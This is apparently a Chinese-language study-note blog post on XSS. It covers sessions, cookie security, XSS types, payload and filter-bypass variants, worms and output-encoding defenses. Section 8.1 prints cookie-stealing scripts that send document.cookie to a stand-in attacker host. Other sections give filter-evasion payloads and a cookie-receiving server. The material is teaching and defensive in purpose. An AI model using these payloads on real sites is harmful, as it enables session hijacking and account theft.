---
title: "XSS 基础及其原理"
date: "2026-11-07T18:17:58+08:00"
tags:
  - CTF
  - Web安全
  - XSS
description: "从会话、Cookie 和浏览器安全机制入手，解释 XSS 的成因与主要类型，梳理载荷构造、实际危害、蠕虫传播及输入输出防护方法。"
---

> 本文根据深信服 SCSA-S 课程《XSS》九节课件整理，覆盖会话管理、Session 攻击、Cookie 安全、HTTP/HTTPS、XSS 原理与分类、Payload 构造、XSS 利用、XSS Worm 与防御。靶场部分见《CTFHUB 入门 XSS 实战 6 题》。

# 引言

XSS（Cross-Site Scripting，跨站脚本攻击）是一类客户端代码注入漏洞：Web 应用把不可信数据输出到 HTML 页面时没有正确编码，浏览器把数据解析为脚本并执行。受害者是浏览器用户，不是服务器；但攻击者可以借助受害者的登录态读取 Cookie、发起请求、修改页面内容或传播蠕虫。

理解 XSS 之前，需要先理解它依赖的会话与凭证机制：HTTP 是无状态协议，服务器依靠 Session ID、Cookie 或 Token 识别用户。XSS 的价值在于**在受害者浏览器中读取或使用这些凭证**，因此课程把会话管理、Session 攻击、Cookie 安全和 HTTP/HTTPS 放在 XSS 之前。

---

# 一、会话管理基础

## 1.1 为什么需要会话管理

HTTP 协议本身不保存请求之间的状态：一次请求处理完成后，服务器无法仅凭协议识别后续请求属于哪个用户。为了跟踪用户状态，Web 应用需要会话管理。

课件对会话管理的定义是：

> 在人机交互时，会话管理是保持用户的整个会话活动的互动与计算机系统跟踪过程。

常见实现方式有三类：

| 方式 | 状态保存位置 | 客户端持有 | 特点 |
| --- | --- | --- | --- |
| 服务端 Session | 服务器 | Session ID | 状态在服务端，便于注销；占用服务器内存，集群需要共享 |
| Cookie-based | 客户端 Cookie | 签名、加密后的登录凭证 | 服务端无状态；受 Cookie 大小、跨域限制 |
| Token-based | 客户端 | Token | 支持跨域和移动端；占带宽，服务端难以主动注销 |

## 1.2 服务端 Session

用户第一次访问应用时，服务器创建 Session 对象，并为每个 Session 分配唯一的 Session ID。服务器把 Session ID 通过 Cookie 返回给浏览器；后续请求携带该 Cookie，服务器根据 Session ID 找到对应 Session。

Session 通常设置有效时间。用户在有效期内发起请求，服务器会刷新过期时间；超时后服务器销毁旧 Session，创建新 Session。

Session 本身不自动具备会话管理能力。只有在用户登录成功后，应用把登录凭证写入 Session，服务器才能通过“Session 中是否存在登录凭证”判断用户是否已登录。用户主动退出时，应用清除 Session 中的凭证。

**优点**：

- 简化开发：多个页面之间共享变量时，Session 比 QueryString 更方便；
- 安全性相对较好：客户端只持有 Session ID，只要 ID 足够随机，攻击者难以伪造；除非通过 CSRF 或 HTTP 劫持冒充。

**缺点**：

- 会话信息存储在 Web 服务器，用户量大时占用内存；
- 集群部署时需要考虑多台服务器之间的 Session 共享；
- 多个应用共享 Session 时存在跨域问题。

## 1.3 Cookie-based 会话管理

Cookie-based 方式把登录凭证直接写入客户端 Cookie，减少服务端存储和架构复杂度。

流程：

1. 用户提交登录请求；
2. 服务端验证用户名、密码；
3. 服务端创建登录凭证（至少包含用户 ID、创建时间、过期时间）；
4. 对凭证做数字签名，再用对称加密算法加密；
5. 把签名、加密后的字符串写入固定名称的 Cookie；
6. 后续请求携带 Cookie，服务端解密、验签、检查过期时间。

数字签名用于防止凭证被篡改；加密用于防止 Cookie 被截获后直接读取用户信息。

**优点**：

- 服务端无状态，只需创建和验证登录 Cookie；
- Cookie 可以在同域名下的多个页面共享；
- 可以设置有效期，控制 Cookie 生命周期。

**缺点**：

- Cookie 有大小限制；
- 每次请求携带 Cookie，增加请求体积；
- 不同域名之间不能共享 Cookie。

## 1.4 Token-based 会话管理

Session 和 Cookie 都依赖 Cookie，不适合原生 App 和纯 API 服务。Token-based 方式把登录凭证称为 Token，客户端在后续请求中通过 URL 参数或 HTTP 头主动携带 Token。

**优点**：

- 支持跨域访问；
- 服务端无状态；
- 适合移动设备和 API 服务。

**缺点**：

- Token 通常比 Session ID 大，占用带宽；
- 服务端难以主动注销 Token，Token 被劫持后难以失效。

## 1.5 会话管理的安全问题

会话凭证本身通常经过随机化、签名或加密，直接预测或伪造的难度较高。主要风险在传输和使用环节：

- 攻击者截获客户端请求中的会话凭证，冒充原用户；
- XSS 读取 Cookie 中的 Session ID；
- 会话固定：攻击者预先设定 Session ID，诱导受害者使用该 ID 登录；
- 弱 Session ID：ID 可预测或可计算。

防御方向包括 HTTPS、HttpOnly、登录后重置 Session ID、关闭 URL 传递 Session ID、校验 User-Agent 等。

---

# 二、Session 攻击

课件把 Session 攻击分为三类：

## 2.1 会话预测

攻击者猜测系统中有效的 Session ID，类似暴力破解。PHP 生成的 Session ID 通常足够复杂且无规律，因此会话预测在现代 PHP 应用中成功率很低。

## 2.2 会话劫持

会话劫持指攻击者窃取合法用户的 Session ID，再使用该 ID 访问目标账号。

攻击步骤：

1. 目标用户登录站点；
2. 用户获得 Session ID；
3. 攻击者通过某种手段捕获 Session ID；
4. 攻击者携带该 Session ID 访问站点，获得合法会话。

获取 Session ID 的方式：

- 暴力破解；
- 预测；
- 窃取：网络嗅探、XSS 等。

PHP 的 Session ID 生成机制相对安全，暴力破解和预测成功率低；窃取主要通过网络层或 XSS 实现。

**防御**：

- 修改 Session 名称，不使用默认的 `PHPSESSID`；
- 关闭透明化 Session ID，避免通过 URL 传递 Session ID；
- 设置 `HttpOnly`，阻止客户端脚本读取 Cookie；
- 关闭 `phpinfo` 等会输出请求信息的页面；
- 校验 HTTP 头信息；
- 使用 HTTPS 防止网络嗅探。

## 2.3 会话固定

会话固定指攻击者诱骗受害者使用攻击者指定的 Session ID。受害者用该 ID 登录后，攻击者再使用同一 ID 获得合法会话。

攻击步骤：

1. 攻击者重置目标用户的 Session ID，并监听会话状态；
2. 目标用户携带攻击者设定的 Session ID 登录；
3. 攻击者使用该 Session ID 获得合法会话。

重置 Session ID 的方式：

- 客户端脚本设置 Cookie：
  `<script>document.cookie="PHPSESSID=99999";</script>`；
- HTML `<meta>` 标签设置 Cookie：
  `<meta http-equiv='Set-Cookie' content='PHPSESSID=23333'>`；
- 在 HTTP 响应中加入 `Set-Cookie` 头。

**防御**：

- 用户登录成功后立即重置 Session ID；
- Session 长时间闲置后重置；
- 使用 `HttpOnly`、关闭透明化 Session ID、校验 User-Agent、校验 Token。

## 2.4 中间人攻击

中间人攻击（MITM）指攻击者在通信两端之间建立独立连接，窃取或篡改数据。常见形式：

- 基于监听的信息窃取；
- 基于监听的身份冒认。

中间人攻击难以发现，因为它通常不中断连接、不安装木马，且网络设备日志有限。防御手段是 HTTPS、证书校验和网络分段。

---

# 三、Cookie 安全机制

## 3.1 Cookie 的工作机制

同域内浏览器发出的请求会自动携带 Cookie，Cookie 出现在请求头的 `Cookie` 字段。服务端通过响应头的 `Set-Cookie` 添加、修改、删除 Cookie；客户端 JavaScript 也可以通过 `document.cookie` 读写 Cookie。Cookie 不能跨浏览器存在。

Cookie 常用于保存会话信息。攻击者获取 Cookie 后，可以在有效期内冒充用户，因此 Cookie 是 XSS 的主要目标之一。

## 3.2 Cookie 的重要字段

| 字段 | 含义 |
| --- | --- |
| `Name` | Cookie 名称 |
| `Value` | Cookie 值 |
| `Expires` | 过期时间 |
| `Path` | 生效路径 |
| `Domain` | 生效域名 |
| `Secure` | 仅通过 HTTPS 传输 |
| `HttpOnly` | 禁止 JavaScript 访问 |

## 3.3 Domain 与 Path

**Domain**：设置 Cookie 时如果不指定 Domain，默认是当前域。子域可以通过 JavaScript 把 Domain 设置为父域，从而在多个子域共享 Cookie；代价是控制其他子域的攻击者也能读取该 Cookie。Domain 不允许设置为下一级子域或其他外域。

**Path**：不指定 Path 时，默认是当前页面路径。JavaScript 可以设置 Cookie 到任意路径，但只有目标路径下的页面 JavaScript 能读取。Path 不能防止重要 Cookie 被窃取，跨 iframe 的 DOM 操作仍可能读取。

## 3.4 HttpOnly

`HttpOnly` 是 Cookie 属性，用于告诉浏览器不要向客户端脚本暴露 Cookie。设置后，JavaScript 无法读写该 Cookie，可以降低 XSS 读取 Cookie 的风险。

设置方式：

```php
setcookie("test", "1", time()+3600, "/", "", 0, 1);
```

`setcookie` 的第 7 个参数是 HttpOnly 标志，`0` 为关闭，`1` 为开启，默认 `0`。

HttpOnly 不是 XSS 的完整防御：它只能阻止脚本读取 Cookie，不能阻止 XSS 以受害者身份发起请求、修改页面或进行钓鱼。此外，历史漏洞可能泄露 HttpOnly Cookie，例如 Apache 2.2.0–2.2.21 的 CVE-2012-0053：攻击者植入超大 Cookie，使请求头超过 `LimitRequestFieldSize`（4192 字节），Apache 返回 400 错误，错误信息中包含 HttpOnly Cookie。

## 3.5 Secure

设置 `Secure` 的 Cookie 仅在 HTTPS 连接中发送，HTTP 请求不会携带。它可以降低中间人截获 Cookie 的风险，但 Secure Cookie 对客户端脚本仍是可读写的，仍可能被 XSS 窃取或篡改。

## 3.6 Cookie 存储

Cookie 按过期时间分为两类：

- **内存 Cookie**：未设置过期时间，浏览器关闭后从内存消失；
- **本地 Cookie**：设置过期时间，以文本形式保存在操作系统本地，过期后消失。

本地 Cookie 可以维持长期登录，但一旦被 XSS 窃取，攻击者可以在很长时间内控制账号。内存 Cookie 也不绝对安全：攻击者可以通过脚本为内存 Cookie 设置过期时间，使其变为本地 Cookie。

浏览器本地存储方式还包括 `localStorage`、`IndexedDB`、Flash Cookie 等。它们的共同点是数据保存在客户端，不能作为可信的身份凭证。

---

# 四、HTTP/HTTPS 与弱 Session ID

## 4.1 HTTP 协议的三个风险

课件总结 HTTP 的风险：

1. 通信使用明文，未加密，TCP/IP 网络可能被窃听；
2. 没有验证通信方身份，可能被冒充；
3. 无法验证报文完整性，可能被篡改。

## 4.2 HTTPS 与 TLS

HTTPS 是 HTTP over TLS，默认端口 443。HTTP 直接与 TCP 通信；HTTPS 中 HTTP 先与 SSL/TLS 通信，SSL/TLS 再与 TCP 通信。

TLS 的目标：

- 所有信息加密传输，第三方无法窃听；
- 配备身份证书，防止冒充；
- 具有校验机制，篡改可被发现。

SSL/TLS 由四部分组成：

- 记录协议（Record Protocol）；
- 握手协议（Handshake Protocol）；
- 警告协议（Alert Protocol）；
- 密码规范改变协议（Change Cipher Protocol）。

记录协议为高层协议提供基本安全服务，执行压缩、加密、解密、MAC 校验；握手协议用于身份验证、协商加密算法和生成密钥。

课件提到 TLS 1.2 是当时使用最广泛的版本；截至 2020 年 3 月，微软、苹果、谷歌等已弃用 TLS 1.0 和 TLS 1.1。

HTTPS 的局限：

- 加解密带来性能开销；
- 不能防御针对服务器本身的攻击、拒绝服务、服务器劫持；
- 证书信用链体系并非绝对安全；
- 证书需要成本，部分场景需要固定 IP；
- 缓存效率低于 HTTP。

## 4.3 弱 Session ID

Weak Session IDs 指 Session ID 生成方式可预测。攻击者一旦计算出有效 Session ID，就可以绕过登录直接访问用户界面。

DVWA 的 Weak Session IDs 模块：

| 级别 | 生成方式 | 预测方法 |
| --- | --- | --- |
| Low | 自增数字，`dvwaSession` 从 1 开始 | 预测下一个数字 |
| Medium | `time()` 返回的时间戳 | 生成当前时间戳 |
| High | 自增数字再做 MD5 | 白盒审计源码后计算 |
| Impossible | 随机数 + 时间戳 + 固定字符串，再做 SHA1 | 稳定安全的组合 |

弱 Session ID 的本质是**凭证熵不足**：ID 的空间太小或生成规律可推导，攻击者可以枚举或计算。

---

# 五、XSS 原理

## 5.1 定义

XSS 全称 Cross-Site Scripting。由于缩写与 CSS（Cascading Style Sheets）冲突，安全领域使用 XSS 作为简称。

课件给出的定义是：

> XSS 就是指通过利用网页开发时留下的漏洞（由于 Web 应用程序对用户的输入过滤不足），巧妙地将恶意代码注入到网页中，使用户浏览器加载并执行攻击者制造的恶意代码，以达到攻击的效果。

恶意代码通常是 JavaScript，也可以是 Java、VBScript、ActiveX、Flash 或普通 HTML。

## 5.2 三个角色与两个条件

XSS 涉及三个角色：

- 攻击者；
- 用户浏览器；
- 服务器。

XSS 属于客户端攻击，受害者最终是用户。但网站管理员也是用户，且权限更高，因此 XSS 可能以管理员为跳板，进一步攻击后台或服务器。

实施 XSS 需要两个条件：

1. 攻击者能够向 Web 页面注入精心构造的恶意代码；
2. 应用对用户输入没有做严格过滤，恶意代码能被浏览器执行。

## 5.3 验证方式

常用验证 payload：

```html
<script>alert(/xss/)</script>
<script>confirm('xss')</script>
<script>prompt("xss")</script>
```

如果浏览器弹出对话框，说明注入的 JavaScript 被执行，XSS 漏洞存在。

## 5.4 危害

XSS 的危害包括：

- 盗取用户账号；
- 窃取 Cookie，冒充用户身份进入网站；
- 劫持用户会话，执行任意操作；
- 刷流量、弹窗广告；
- 传播蠕虫；
- 记录键盘输入；
- 修改页面内容、实施钓鱼。

---

# 六、XSS 分类

课件把 XSS 分为三类：

| 类型 | 数据流 | 持久性 | 典型场景 |
| --- | --- | --- | --- |
| 反射型 | 浏览器 → 服务器 → 浏览器 | 非持久 | 搜索结果页、错误页 |
| 存储型 | 浏览器 → 服务器 → 数据库 → 服务器 → 浏览器 | 持久 | 留言板、评论区、个人资料 |
| DOM 型 | URL → 浏览器 | 非持久 | `innerHTML`、`document.write`、`location.href` |

## 6.1 反射型 XSS

反射型 XSS 又称非持久型 XSS。用户在请求 URL 时携带数据，服务端未对参数做判断或过滤，直接把参数返回响应页面，恶意代码随响应进入浏览器并执行。

特点：

- 非持久性；
- 参数型脚本；
- JS 代码位于 URL 参数中；
- 数据流：浏览器 → 后端 → 浏览器。

利用方式通常是构造包含 payload 的链接，诱导受害者点击。

## 6.2 存储型 XSS

存储型 XSS 又称持久型 XSS。恶意代码被保存到数据库、文件等持久化介质中，其他用户访问页面时触发。

特点：

- 持久性；
- JS 代码不在 URL 参数中，而是写入数据库或文件；
- 数据流：浏览器 → 后端 → 数据库 → 后端 → 浏览器；
- 危害通常大于反射型，因为无需诱导点击特定链接，所有访问该页面的用户都会中招。

常见位置：用户评论、留言板、个人签名、昵称、文章内容。

## 6.3 DOM 型 XSS

DOM 型 XSS 基于文档对象模型（Document Object Model）。它与反射型、存储型的区别是：**攻击代码不需要服务器解析响应，触发依赖浏览器端的 DOM 解析**。

DOM 把文档表示为节点树，节点类型包括：

- 元素节点：`<body>`、`<p>`、`<ul>` 等；
- 文本节点：元素中的文本内容；
- 属性节点：元素的属性。

JavaScript 可以访问 DOM 并修改页面内容。常见的危险操作（sink）包括：

- `document.getElementById("x").innerHTML = ...`；
- `document.write(...)`；
- `element.outerHTML`；
- `location.href = ...`；
- jQuery 的 `.html()`、`.append()` 等。

DOM 型 XSS 的数据流是 URL → 浏览器，服务端可能完全看不到 payload。例如页面从 `location.hash` 或 `location.search` 读取数据，再写入 `innerHTML`。

**注意**：通过 `innerHTML` 插入的 `<script>` 标签通常不会执行，因为浏览器把通过 `innerHTML` 插入的脚本标记为已执行。攻击者会使用事件处理器，例如 `<img src=x onerror=...>`，或通过闭合字符串、注入 HTML 属性来触发脚本。

---

# 七、Payload 构造与变形

## 7.1 构造方式

**HTML 标签与 script 标签**

```html
<h1 style="color:green;">XSS</h1>
<script>alert(/xss/)</script>
```

**HTML 属性与伪协议**

```html
<a href="javascript:alert(/xss/)">touch me!</a>
```

`javascript:` 伪协议在用户点击链接时执行脚本。

**事件处理器**

```html
<img src="./smile.jpg" onmouseover="alert(/xss/)">
<input type="text" onclick="alert(/xss/)">
```

常见事件类型包括 Window 事件、Form 事件、Keyboard 事件、Mouse 事件、Media 事件。

**CSS**

历史浏览器支持通过 CSS 触发脚本，例如：

```html
<div style="background-image:url(javascript:alert(/xss/))">
<div style="width:expression(alert(/xss/))">
```

这类方式主要适用于旧版 IE，现代浏览器基本不再支持，仅作为历史知识了解。

## 7.2 变形方式

过滤器通常基于关键字或字符黑名单，攻击者通过变形绕过：

| 变形 | 示例 |
| --- | --- |
| 大小写 | `<iMg sRc='#' Onerror="alert(/xss/)" />` |
| 双写关键字 | `<scrscriptipt>alert(/xss/)</scrscriptipt>` |
| 引号变化 | 属性可以不用引号；JS 中可用反引号 |
| `/` 代替空格 | `<img/src='#'/onerror='alert(/xss/)' />` |
| Tab 与回车 | 在关键字中插入制表符或换行 |
| HTML 实体编码 | `&#97;`、`&#x61;` 表示 `a` |
| URL 编码 | `%3Cscript%3Ealert(/xss/)%3C/script%3E` |

变形的本质是**利用过滤器与浏览器解析器的差异**：过滤器看到的字符串与浏览器最终解析的语法不一致。

---

# 八、XSS 利用

## 8.1 窃取 Cookie

Cookie 中可能包含 Session ID 或登录凭证。XSS 可以通过多种方式把 Cookie 发送到攻击者服务器：

```html
<script>
document.location = "https://attacker.example/collect?cookie=" + document.cookie;
</script>
```

```html
<script>
new Image().src = "https://attacker.example/collect?cookie=" + document.cookie;
</script>
```

```html
<script>
document.write('<img src="https://attacker.example/collect?cookie=' + document.cookie + '" width=0 height=0 />');
</script>
```

接收端可以用 PHP、Python 或 XSS 平台记录请求。拿到 Cookie 后，攻击者可以将其导入浏览器或工具，冒充受害者会话。

## 8.2 会话劫持

XSS 窃取 Session ID 后，攻击者使用该 ID 访问站点，服务器会认为是受害者本人。若 Session ID 设置了 HttpOnly，脚本无法读取 Cookie，但 XSS 仍可以在受害者浏览器中直接发起请求，执行受害者权限内的操作。

## 8.3 XSS 钓鱼

**重定向钓鱼**：通过 XSS 修改 `location.href`，把用户跳转到伪造页面。

**HTML 注入式钓鱼**：注入一个覆盖原页面的登录表单，诱导用户输入账号密码。

**iframe 钓鱼**：通过 `<iframe src="...">` 嵌入远程页面。

**高级钓鱼**：劫持 HTML 表单提交、使用 JavaScript 记录键盘输入、篡改页面内容。

## 8.4 XSS Worm

XSS Worm 是一段脚本程序，通常用 JavaScript 或 VBScript 编写，在用户浏览 XSS 页面时被激活，利用站点的 XSS 漏洞按特定规则传播和感染。

典型流程：

1. 攻击者发现目标站点存在 XSS 漏洞；
2. 利用一个宿主页面作为传播源头；
3. 其他用户访问被感染页面时，蠕虫判断用户是否登录、是否已感染；
4. 未感染用户被感染，蠕虫继续向其他用户传播。

案例：

- **MySpace Samy Worm（2005 年 10 月 4 日）**：Samy 利用 MySpace 的 XSS 漏洞，让用户在不知情的情况下把作者加为好友，并在个人简介中加入“samy is my hero”。蠕虫在一天内感染超过 100 万用户，导致 MySpace 服务器崩溃。
- **新浪微博 XSS 蠕虫（2011 年 6 月 28 日）**：用户自动发布带链接的微博和私信，并自动关注 `hellosamy`。攻击持续 16 分钟，感染约 33000 个用户。漏洞成因是新浪对参数 `g` 完全没有过滤；Chrome、Safari 的 XSS Filter 拦截了攻击，IE、Firefox 未幸免。

XSS Worm 的关键是**自动传播**：受害者浏览器执行脚本后，脚本代替受害者向其他用户发送带 payload 的链接或消息，形成链式感染。

---

# 九、XSS 防御

## 9.1 XSS Filter

XSS Filter 通过正则表达式对客户端请求参数做脚本过滤，是防御 XSS 的常见手段之一。Chrome 等浏览器曾内置 XSS Filter，用于拦截反射型 XSS。

XSS Filter 的局限：

- 基于规则，可能被变形绕过；
- 难以覆盖所有上下文；
- 不能替代输出编码；
- 浏览器厂商已逐步移除内置 XSS Auditor，不能依赖浏览器过滤。

## 9.2 输入过滤与输出编码

课件把防御分为两类：

- **Input Filtering**：在输入端验证数据的长度、类型、语法和业务规则；
- **Output Filtering**：在输出前对数据进行编码，确保数据被当作文本而不是可执行脚本。

OWASP 建议结合输入验证和输出过滤。

**输入验证**：使用强类型检查，验证类型、长度、格式、范围。例如电话号码只允许数字，IP 地址使用 `filter_var` 校验。重要敏感信息（价格、折扣）应在服务端校验，不能依赖客户端。

**数据净化**：删除或转义潜在危险字符，如 `<`、`>`、`'`、`"`、`&`、`#`、`javascript`。仅过滤这些字符不够，还需要输出编码。

## 9.3 输出编码

输出编码是把特殊字符转换为 HTML 实体，使浏览器将其作为文本显示，而不是解析为标签或脚本。

PHP 的 `htmlspecialchars()` 可以转换五个字符：

| 字符 | 实体 |
| --- | --- |
| `<` | `&lt;` |
| `>` | `&gt;` |
| `&` | `&amp;` |
| `"` | `&quot;` |
| `'` | `&#39;` |

示例：

```php
echo htmlspecialchars($query, ENT_QUOTES, 'UTF-8');
```

## 9.4 上下文相关编码

不同输出位置的编码规则不同：

| 上下文 | 示例 | 编码要求 |
| --- | --- | --- |
| HTML 正文 | `<b>查询：<?=$query?></b>` | HTML 实体编码 |
| HTML 属性 | `<input value="<?=$query?>">` | HTML 属性编码，属性值加引号 |
| `<script>` 内部 | `var msg='<?=$query?>';` | JavaScript 编码，避免 `</script>` |
| JavaScript 事件 | `onclick='GotoUrl("<?=$targetUrl?>")'` | 先 HTML 编码，再 JavaScript 编码 |
| URL 参数 | `href="/search?q=<?=$query?>"` | URL 编码 |

核心原则：**未信任数据嵌入任何输出之前，都应按上下文转义规则编码**。

## 9.5 其他防御

- 会话 Cookie 设置 `HttpOnly`，降低 XSS 窃取 Cookie 的风险；
- 设置 `Secure`，仅通过 HTTPS 传输 Cookie；
- 部署 CSP（Content Security Policy），限制脚本来源，作为纵深防御；
- 对富文本使用白名单清洗，而不是简单替换 `<script>`；
- 对用户输入做长度限制和类型校验；
- 对管理后台、敏感操作增加二次验证；
- 记录并监控异常脚本注入行为。

---

# 十、XSS 相关工具

## 10.1 Burp Suite

Burp Suite 的 Proxy 模块可以拦截、查看、修改 HTTP 请求：

1. 打开 Proxy → Intercept，确认拦截开启；
2. 浏览器访问目标 URL，请求会暂停在 Burp；
3. 点击 Forward 放行，或 Drop 丢弃；
4. 右键请求，选择 Do an active scan 进行主动扫描；
5. 查看扫描结果，Burp 会标记 XSS 等漏洞并生成报告。

## 10.2 XSS 测试平台

XSS 平台用于接收 XSS 请求、记录 Cookie、管理 payload。课件提到的平台基于 xsser.me，功能包括窃取 Cookie、后台增删改文章、钓鱼、修改页面代码等。

使用第三方平台时需要注意数据安全：Cookie 和 payload 会发送到第三方服务器，敏感环境应使用自建接收端。

## 10.3 自建接收端

可以使用简单的 HTTP 服务记录请求：

```python
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(self.path)
        self.send_response(204)
        self.end_headers()

HTTPServer(("0.0.0.0", 8000), Handler).serve_forever()
```

公网访问可以通过内网穿透或云服务器实现。接收端只用于授权测试，测试结束后应及时关闭。

---

# 十一、总结

XSS 的核心是**不可信数据进入 HTML/JavaScript 上下文并被浏览器执行**。需要掌握：

1. **会话与凭证**：Session、Cookie、Token 的存储位置和安全属性；
2. **Session 攻击**：预测、劫持、固定，以及登录后重置 Session ID；
3. **Cookie 安全**：Domain、Path、HttpOnly、Secure；
4. **HTTP/HTTPS**：明文、身份、完整性风险，TLS 的作用与局限；
5. **XSS 分类**：反射型、存储型、DOM 型的数据流与差异；
6. **Payload 构造与变形**：标签、伪协议、事件、CSS，以及大小写、双写、编码等绕过；
7. **XSS 利用**：Cookie 窃取、会话劫持、钓鱼、XSS Worm；
8. **防御**：输入验证、输出编码、上下文转义、HttpOnly、CSP。

XSS 不是单一的“弹窗漏洞”。它的实际影响取决于受害者的权限、Cookie 的安全属性、应用的 CSP 配置以及攻击者是否能形成自动传播。分析时应结合数据流、输出上下文和浏览器解析行为，而不是只测试一个 `<script>alert(1)</script>`。
